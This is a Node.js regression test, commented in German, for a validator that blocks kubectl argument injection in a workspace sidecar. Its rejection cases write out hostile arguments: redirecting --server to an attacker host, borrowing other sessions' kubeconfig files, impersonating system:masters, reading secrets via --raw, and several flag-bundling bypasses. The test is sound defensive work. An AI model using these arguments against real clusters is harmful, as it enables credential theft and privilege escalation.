#!/usr/bin/env node
/*
 * Kube-Exec-Args-Check (Review-Fund C-2, 2026-10-12).
 *
 * POST /kube/exec im Workspace-Sidecar prüfte nur `Array.isArray(args)` und
 * `typeof a === 'string'`. `execFile` verhindert Shell-Injection, aber keine
 * Argument-Injection: --kubeconfig auf eine fremde Session, --server auf einen
 * Angreifer (Client-Cert/Token wandern mit), --as=system:masters,
 * `create -f https://…` und jedes schreibende Verb gingen durch.
 *
 * Prüft die reine Validierungsfunktion aus workspace/server/kube-args.js.
 * Braucht weder dist/ noch einen laufenden Sidecar.
 */
const path = require('node:path');
const assert = require('node:assert/strict');

const { validateKubectlArgs } = require(
  path.resolve(__dirname, '..', '..', 'workspace', 'server', 'kube-args.js'),
);

const EXPECTED_CHECKS = 6;

let failures = 0, total = 0;
function check(label, fn) {
  total += 1;
  try { fn(); console.log(`✓ ${label}`); }
  catch (err) { failures += 1; console.error(`✗ ${label}\n    ${err && err.stack ? err.stack : err}`); }
}

const ok = (args) => assert.equal(validateKubectlArgs(args), null, `abgelehnt: ${JSON.stringify(args)}`);
const bad = (args) => assert.notEqual(validateKubectlArgs(args), null, `durchgelassen: ${JSON.stringify(args)}`);

check('die fünf Angriffe aus dem Review werden abgelehnt', () => {
  bad(['get', 'pods', '--kubeconfig=/run/kube-sessions/other.yaml']);
  bad(['get', 'pods', '--kubeconfig', '/run/kube-sessions/other.yaml']);
  bad(['get', 'pods', '--server=https://attacker.tld', '--insecure-skip-tls-verify']);
  bad(['get', 'pods', '-s', 'https://attacker.tld']);
  bad(['get', 'pods', '--as=system:admin', '--as-group=system:masters']);
  bad(['create', '-f', 'https://evil/x.yaml']);
  for (const verb of ['delete', 'apply', 'scale', 'exec', 'edit', 'patch', 'cp', 'port-forward',
    'proxy', 'run', 'label', 'annotate', 'rollout', 'drain', 'cordon', 'debug', 'attach', 'replace']) {
    bad([verb, 'pods']);
  }
});

check('Global-Flags vor dem Verb und unbekannte Verben werden abgelehnt', () => {
  bad(['--kubeconfig=/x', 'get', 'pods']);
  bad(['-n', 'kube-system', 'get', 'pods']);
  bad(['constructor']);
  bad(['__proto__']);
  bad(['toString']);
});

check('Datei- und Rohzugriffe: -f ausserhalb logs, -o *-file, --raw, config view', () => {
  bad(['get', '-f', '/run/kube-sessions/other.yaml']);
  bad(['describe', '--filename=/etc/passwd']);
  bad(['get', 'pods', '-o', 'go-template-file=/run/kube-sessions/x.yaml']);
  bad(['get', 'pods', '-o=jsonpath-file=/x']);
  bad(['get', 'pods', '--output=custom-columns-file=/x']);
  bad(['get', '--raw', '/api/v1/namespaces/kube-system/secrets']);
  bad(['config', 'view', '--raw']);
  bad(['config', 'view']);
  bad(['get', 'pods', '-w']);
  bad(['get', 'pods', '--watch']);
});

check('Umgehungsformen: gebündelte Kurzflags, -nfoo, --, Wert mit führendem -', () => {
  bad(['get', 'pods', '-Ao', 'yaml']);
  bad(['get', 'pods', '-nkube-system']);
  bad(['get', 'pods', '-n=kube-system']);
  bad(['get', 'pods', '--', '--kubeconfig=/x']);
  bad(['get', 'pods', '-n', '--kubeconfig=/x']);
  bad(['get', 'pods', '-n']);
  bad(['get', 'pods', '--all-namespaces=yes']);
  bad(['logs', 'p', '--tail', '--server=https://x']);
});

check('-f ist nur bei logs erlaubt und bedeutet dort follow', () => {
  ok(['logs', 'web-0', '-f', '--tail', '50']);
  bad(['get', 'pods', '-f']);
  bad(['describe', 'pod', 'x', '-f', 'y']);
});

check('legitime Lesekommandos gehen durch', () => {
  ok(['get', 'pods']);
  ok(['get', 'pods', '-n', 'default', '-o', 'wide']);
  ok(['get', 'deploy', '-A', '-o', 'json']);
  ok(['get', 'pods', '--namespace=default', '-l', 'app=web', '--field-selector=status.phase=Running']);
  ok(['get', 'pods', '-o', 'jsonpath={.items[*].metadata.name}']);
  ok(['get', 'pods', '--all-namespaces=true']);
  ok(['describe', 'pod', 'web-0', '-n', 'default']);
  ok(['logs', 'web-0', '-c', 'app', '--since=1h', '--timestamps', '-p']);
  ok(['top', 'pods', '--containers', '-n', 'default']);
  ok(['version', '-o', 'json']);
  ok(['api-resources', '--namespaced=true', '-o', 'name']);
  ok(['explain', 'deployment.spec', '--recursive']);
  ok(['config', 'current-context']);
  ok(['config', 'get-contexts']);
  ok(['auth', 'can-i', 'list', 'pods', '-n', 'default']);
  // Semikolon im Positionsargument bleibt Text (Shell-Schutz liegt bei execFile).
  ok(['get', 'pods;id']);
});

console.log(`\n${total - failures}/${total} passed`);
if (total !== EXPECTED_CHECKS) {
  console.error(`Erwartet ${EXPECTED_CHECKS} Checks, gelaufen ${total}`);
  process.exit(1);
}
process.exit(failures === 0 ? 0 : 1);
